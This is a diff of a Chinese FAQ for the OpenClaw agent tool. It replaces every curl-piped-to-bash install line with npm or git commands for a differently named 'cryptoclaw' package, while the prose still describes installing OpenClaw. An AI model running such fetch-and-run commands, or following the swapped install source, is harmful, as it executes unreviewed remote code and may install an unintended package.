@@ -277,10 +277,10 @@ x-i18n:
 这些工具可以读取仓库、运行命令、检查日志，并帮助修复你的机器级别设置（PATH、服务、权限、认证文件）。通过可编辑（git）安装提供**完整源代码**：
 
 ```bash
-curl -fsSL https://openclaw.ai/install.sh | bash -s -- --install-method git
+git clone https://github.com/TermiX-official/cryptoclaw.git && cd cryptoclaw && pnpm install && pnpm build
 ```
 
-这会从 **git checkout** 安装 OpenClaw，这样智能体可以读取代码 + 文档，并推理你正在运行的确切版本。你可以随时通过不带 `--install-method git` 重新运行安装程序切回稳定版。
+这会从 **git checkout** 安装 OpenClaw，这样智能体可以读取代码 + 文档，并推理你正在运行的确切版本。你可以随时通过 `npm install -g @termix-it/cryptoclaw@latest` 切回稳定版。
 
 提示：要求智能体**计划并监督**修复（逐步进行），然后只执行必要的命令。这样改动较小，更容易审查。
 
@@ -313,7 +313,7 @@ openclaw doctor
 仓库推荐从源码运行并使用新手引导向导：
 
 ```bash
-curl -fsSL https://openclaw.ai/install.sh | bash
+npm install -g @termix-it/cryptoclaw@latest
 openclaw onboard --install-daemon
 ```
 
@@ -453,15 +453,15 @@ https://github.com/openclaw/openclaw/blob/main/CHANGELOG.md
 一行命令（macOS/Linux）：
 
 ```bash
-curl -fsSL --proto '=https' --tlsv1.2 https://openclaw.ai/install.sh | bash -s -- --beta
+npm install -g @termix-it/cryptoclaw@beta
 ```
 
 ```bash
-curl -fsSL --proto '=https' --tlsv1.2 https://openclaw.ai/install.sh | bash -s -- --install-method git
+git clone https://github.com/TermiX-official/cryptoclaw.git && cd cryptoclaw && pnpm install && pnpm build
 ```
 
 Windows 安装程序（PowerShell）：
-https://openclaw.ai/install.ps1
+npm install -g @termix-it/cryptoclaw@latest
 
 更多详情：[开发渠道](/install/development-channels)和[安装程序标志](/install/installer)。
 
@@ -489,7 +489,7 @@ openclaw update --channel dev
 2. **可编辑安装（从安装程序网站）：**
 
 ```bash
-curl -fsSL https://openclaw.ai/install.sh | bash -s -- --install-method git
+git clone https://github.com/TermiX-official/cryptoclaw.git && cd cryptoclaw && pnpm install && pnpm build
 ```
 
 这会给你一个可编辑的本地仓库，然后通过 git 更新。
@@ -511,19 +511,19 @@ pnpm build
 使用**详细输出**重新运行安装程序：
 
 ```bash
-curl -fsSL https://openclaw.ai/install.sh | bash -s -- --verbose
+npm install -g @termix-it/cryptoclaw@latest --loglevel verbose
 ```
 
 带详细输出的 Beta 安装：
 
 ```bash
-curl -fsSL https://openclaw.ai/install.sh | bash -s -- --beta --verbose
+npm install -g @termix-it/cryptoclaw@beta --loglevel verbose
 ```
 
 可编辑（git）安装：
 
 ```bash
-curl -fsSL https://openclaw.ai/install.sh | bash -s -- --install-method git --verbose
+git clone https://github.com/TermiX-official/cryptoclaw.git && cd cryptoclaw && pnpm install && pnpm build
 ```
 
 更多选项：[安装程序标志](/install/installer)。
@@ -555,7 +555,7 @@ curl -fsSL https://openclaw.ai/install.sh | bash -s -- --install-method git --ve
 使用**可编辑（git）安装**，这样你在本地拥有完整的源码和文档，然后从该文件夹向你的机器人（或 Claude/Codex）提问，这样它可以读取仓库并精确回答。
 
 ```bash
-curl -fsSL https://openclaw.ai/install.sh | bash -s -- --install-method git
+git clone https://github.com/TermiX-official/cryptoclaw.git && cd cryptoclaw && pnpm install && pnpm build
 ```
 
 更多详情：[安装](/install)和[安装程序标志](/install/installer)。
